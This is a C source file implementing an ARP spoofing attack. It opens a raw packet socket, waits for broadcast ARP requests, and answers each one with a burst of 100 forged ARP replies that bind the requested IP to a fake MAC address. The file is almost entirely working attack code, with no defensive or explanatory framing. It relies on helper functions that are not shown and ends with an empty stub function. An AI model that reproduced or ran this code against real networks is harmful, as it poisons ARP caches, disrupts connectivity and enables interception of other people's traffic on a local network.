#include"net.h"
#include"client.h"

int arp_attack_func(void)
{
    int sockfd;
    u8 mymac[MAC_SIZE];
    u8 dstmac[MAC_SIZE];
    int i,ret;
    u8 data[2048];
    u8 send_arp_attack_buf[128];
    u8 broad_mac[6]={0xff,0xff,0xff,0xff,0xff,0xff};
    u8 fuck_mac[6] = {0x11,0x22,0x33,0x44,0x55,0x66};

    sockfd = socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
    if(sockfd < 0)
    {
        printf("socket error 1\n");
        return 1;
    }
    struct ifreq req;
    strcpy(req.ifr_ifrn.ifrn_name,ETH_NAME);
    if(ioctl(sockfd,SIOCGIFHWADDR,&req) < 0)//GET HWADDR
    {
        printf("get hwaddr error\n");
        return 2;
    }
    memcpy(mymac,req.ifr_ifru.ifru_hwaddr.sa_data,MAC_SIZE);

#if LOVEYWM
    printf("my mac:\n");
    for(i=0;i<MAC_SIZE;i++)
    {
        if(i == 5)
        {
            printf("%02x",mymac[i]);
            continue;
        }
        printf("%02x:",mymac[i]);
    }
    printf("\nmy mac end\n");
#endif

    if(ioctl(sockfd,SIOCGIFINDEX,&req) < 0)//GET INDEX
    {
        printf("get index error\n");
        return 3;
    }
#if LOVEYWM
    printf("req.ifr_ifindex==%d\n",req.ifr_ifindex);
#endif
    struct sockaddr_ll sll;
    memset(&sll,0,sizeof(struct sockaddr_ll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = req.ifr_ifindex;
    //bind send and recv addr of wlan0
    ret = bind(sockfd,(struct sockaddr *)&sll,sizeof(struct sockaddr_ll));
    if(ret < 0)
    {
        printf("bind errno==%d\n",errno);
        return 4;
    }
#if LOVEYWM
    mk_eth(data,broad_mac,mymac,TYPE_ARP);//MAKE ETH
    mk_arp(data+sizeof(struct eth_t),OP_ARP_REQ,mymac,(u8 *)MY_IP,dstmac,(u8 *)DST_IP);

    //ret = send(sockfd,data,sizeof(struct eth_t)+sizeof(struct arp_t),0);
    ret = tcpclient_send(sockfd,data,sizeof(struct eth_t)+sizeof(struct arp_t));
    if(ret < 0)
    {
        printf("send errno==%d\n",errno);
        return 5;
    }
#endif
    struct eth_t *eth = (struct eth_t *)data;
    struct arp_t *arp = (struct arp_t *)(data+sizeof(struct eth_t));
DO_RECV:
    int TimeOut = GetMainTickCount() + 2000;

    while(GetMainTickCount() < TimeOut)
    {
        ret = recv(sockfd,data,2048,MSG_DONTWAIT);
        if(ret > 0)
        {
            printf("recv ok\n");
            break;
        }
    }
    //printf("eth->type==%02x\n",ntohs(eth->type));
    //printf("arp->op==%02x\n",ntohs(arp->op));
    //printf("eth->type==%02x\n",eth->type);

    if(memcmp(eth->dst_mac,broad_mac,6) != 0)
    {
        printf("NOT A BROADCAST\n");
        goto DO_RECV;
    }
    if(ntohs(eth->type) != TYPE_ARP)
    {
        printf("NOT ARP \n");
        goto DO_RECV;
    }
    printf("THE request of MAC");
    show_mac_addr(eth->src_mac);
    printf("\n");

    if(ntohs(arp->op) != OP_ARP_REQ)
    {
        printf("NOT ARP REQUEST\n");
        goto DO_RECV;
    }
    memset(send_arp_attack_buf,0,128);
    mk_eth(send_arp_attack_buf,eth->src_mac,fuck_mac,TYPE_ARP);//MAKE ETH
    mk_arp_num(send_arp_attack_buf+sizeof(struct eth_t),OP_ARP_REP,fuck_mac,arp->dst_ip,eth->src_mac,arp->src_ip);
int xxx=100;
while(xxx--){
    //ret = send(sockfd,data,sizeof(struct eth_t)+sizeof(struct arp_t),0);
    ret = tcpclient_send(sockfd,send_arp_attack_buf,sizeof(struct eth_t)+sizeof(struct arp_t));
    if(ret < 0)
    {
        printf("send errno==%d\n",errno);
        //return 5;
    }
    printf("xxx==%d\n",xxx);
}

goto DO_RECV;




    return 0;
}

void send_arp_attack()
{


}
